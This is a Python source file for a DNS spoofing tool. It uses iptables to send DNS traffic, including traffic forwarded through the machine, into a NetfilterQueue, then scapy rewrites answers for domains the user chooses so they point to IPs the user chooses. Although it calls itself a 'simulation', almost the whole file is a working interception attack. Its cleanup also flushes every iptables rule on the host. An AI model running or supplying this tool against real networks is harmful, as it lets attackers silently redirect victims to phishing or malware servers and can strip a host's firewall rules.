import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from colorama import Fore, Style, init
import os
import random
import time
import logging
import subprocess
import sys
import re

# Initialize colorama for colored terminal output
init(autoreset=True)

# --- Configuration ---
# --- Logging Configuration ---
log_file = "dns_spoof.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Suppress Scapy warnings

# --- Global State ---
IPTABLES_RULE_APPLIED = False

def is_valid_ip(ip):
    """
    Checks if a string is a valid IP address.
    """
    pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    if not pattern.match(ip):
        return False
    parts = list(map(int, ip.split('.')))
    return all(0 <= p <= 255 for p in parts)

def get_user_input_config():
    """
    Prompts the user to enter domains and redirect IPs for the simulation.
    """
    print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Interactive DNS Spoofing Configuration{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")

    domains = []
    while not domains:
        domains_input = input(f"{Fore.YELLOW}Enter domains to spoof (comma-separated, e.g., google.com,twitter.com): {Style.RESET_ALL}")
        domains = [d.strip().lower() for d in domains_input.split(',') if d.strip()]
        if not domains:
            print(f"{Fore.RED}Invalid input. Please enter at least one domain.{Style.RESET_ALL}")

    ips = []
    while not ips:
        ips_input = input(f"{Fore.YELLOW}Enter redirect IP addresses (comma-separated, e.g., 192.168.1.100,10.0.0.1): {Style.RESET_ALL}")
        ips = [i.strip() for i in ips_input.split(',') if i.strip()]
        if not ips or not all(is_valid_ip(i) for i in ips):
            print(f"{Fore.RED}Invalid input. Please enter at least one valid IP address.{Style.RESET_ALL}")
            ips = []

    print(f"{Fore.GREEN}\nConfiguration loaded successfully.{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Domains to spoof: {', '.join(domains)}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Redirect IPs: {', '.join(ips)}{Style.RESET_ALL}")

    return domains, ips

def process_packet(packet, domains_to_spoof, redirect_ip_pool):
    """
    Processes each packet received by the NetfilterQueue, checks if it is a DNS response
    for a target domain, and spoofs the response if it is.
    """
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        
        # Check if packet is a DNS response
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNS].qd.qname.decode()
            
            # Case-insensitive domain matching
            if any(domain in qname.lower() for domain in domains_to_spoof):
                redirect_ip = random.choice(redirect_ip_pool)
                
                logging.info(f"{Fore.YELLOW}Intercepting query for {qname}{Style.RESET_ALL}")
                
                # Craft the fake DNS response
                scapy_packet[scapy.DNS].an = scapy.DNSRR(
                    rrname=scapy_packet[scapy.DNS].qd.qname,
                    rdata=redirect_ip
                )
                
                # --- THIS LINE IS THE FIX ---
                scapy_packet[scapy.DNS].ancount = 1
                
                logging.info(f"{Fore.GREEN}Redirecting {qname} to {redirect_ip}{Style.RESET_ALL}")
                
                # Remove checksums and lengths to prevent packet corruption
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                # Set the modified packet back to the queue and accept it
                packet.set_payload(bytes(scapy_packet))
            
    except Exception as e:
        # Drop the packet on any error to prevent network issues
        logging.error(f"{Fore.RED}Error processing packet, dropping: {e}{Style.RESET_ALL}")
        packet.drop()
        return

    packet.accept()

def setup_iptables():
    """Sets up the iptables rules to intercept DNS traffic."""
    global IPTABLES_RULE_APPLIED
    try:
        # Rules to intercept traffic from the local machine (for testing)
        subprocess.run(["iptables", "-I", "OUTPUT", "-p", "udp", "--dport", "53", "-j", "NFQUEUE", "--queue-num", "1"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["iptables", "-I", "INPUT", "-p", "udp", "--sport", "53", "-j", "NFQUEUE", "--queue-num", "1"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Original rule for forwarding traffic through the machine
        subprocess.run(["iptables", "-I", "FORWARD", "-p", "udp", "--dport", "53", "-j", "NFQUEUE", "--queue-num", "1"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        logging.info(f"{Fore.GREEN}iptables rules applied successfully.{Style.RESET_ALL}")
        IPTABLES_RULE_APPLIED = True
    except subprocess.CalledProcessError as e:
        logging.error(f"{Fore.RED}Failed to set iptables rules: {e.stderr.decode()}{Style.RESET_ALL}")
        return False
    return True

def flush_iptables():
    """Flushes the iptables rules."""
    global IPTABLES_RULE_APPLIED
    if IPTABLES_RULE_APPLIED:
        logging.info(f"{Fore.GREEN}Flushing iptables rules...{Style.RESET_ALL}")
        subprocess.run(["iptables", "--flush"], check=True)
        IPTABLES_RULE_APPLIED = False

def start_dns_spoofing():
    """
    Main function to start the DNS spoofing simulation.
    """
    domains_to_spoof, redirect_ip_pool = get_user_input_config()

    logging.info(f"\n{Fore.YELLOW}{Style.BRIGHT}DNS Spoofing Attack Simulation{Style.RESET_ALL}")
    logging.info(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")
    
    if not setup_iptables():
        return

    try:
        queue = NetfilterQueue()
        # Use a lambda function to pass the user's input to process_packet
        queue.bind(1, lambda packet: process_packet(packet, domains_to_spoof, redirect_ip_pool))
        logging.info(f"\n{Fore.GREEN}Starting DNS spoofing... Press Ctrl+C to stop.{Style.RESET_ALL}")
        queue.run()
    except KeyboardInterrupt:
        pass
    finally:
        flush_iptables()

if __name__ == "__main__":
    # Check for root privileges before starting anything
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        sys.exit(1)
    
    start_dns_spoofing()